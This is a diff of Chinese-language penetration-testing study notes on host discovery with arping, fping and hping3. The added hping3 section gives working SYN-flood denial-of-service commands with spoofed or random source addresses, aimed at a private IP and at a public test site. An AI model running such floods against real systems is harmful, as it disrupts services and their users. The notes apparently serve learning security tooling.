@@ -1,8 +1,8 @@
 # 01 -  信息收集
-## 存活主机识别
-### arping
+## 1.1存活主机识别
+### 1.1.1 arping
 pass
-### fping
+### 1.1.2 fping
 
 Fping类似于ping，但比ping强大。Fping与ping不同的地方在于，fping可以在命令行中指定要ping的主机数量范围，也可以指定含有要ping的主机列表文件。
 
@@ -14,10 +14,17 @@ fping -f filename；
 
 fping -g IP1 IP2（IP1地址开始范围，IP2地址结束范围）；
 ```
-### hping3
+### 1.1.3 hping3
 
 
 使用hping3进行DoS攻击：
+
+使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。
+
+```
+hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
+```
+now I use testphp.vulnweb.com to test :
 
 ```
 hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source testphp.vulnweb.com
